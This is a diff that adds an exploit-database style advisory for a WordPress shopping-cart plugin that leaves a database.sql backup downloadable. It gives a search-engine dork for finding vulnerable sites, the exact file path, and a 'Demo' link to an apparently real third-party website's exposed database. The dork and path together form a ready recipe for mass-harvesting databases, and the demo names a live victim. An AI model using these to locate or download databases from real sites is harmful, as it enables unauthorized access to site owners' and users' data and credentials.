@@ -1,0 +1,20 @@
+#################################
+# Exploit Title: Wordpress Plugins Simple-e-commerce-shopping-cart DatabaseSQL Backup Disclosure Vulnerability
+# Author Bug: L4663r666h05t x Indonesian Code Party
+# Date: 15 Juny 2019
+# Vendor: https://github.com/wp-plugins/simple-e-commerce-shopping-cart
+# Dork: inurl:/wp-content/plugins/simple-e-commerce-shopping-cart/
+#################################
+
+File: database.sql
+Location: http://localhost/wp-content/plugins/simple-e-commerce-shopping-cart/sql/database.sql
+------------------------------------------------------------------
+
+Impact:
+An Attacker can view or download a database. Maybe an attacker can view
+an username & password or only a backup data. But thats really dangerous.
+
+------------------------------------------------------------------
+Demo:
+http://www.printforcardealers.com/wp-content/plugins/simple-e-commerce-shopping-cart/sql/database.sql
+------------------------------------------------------------------
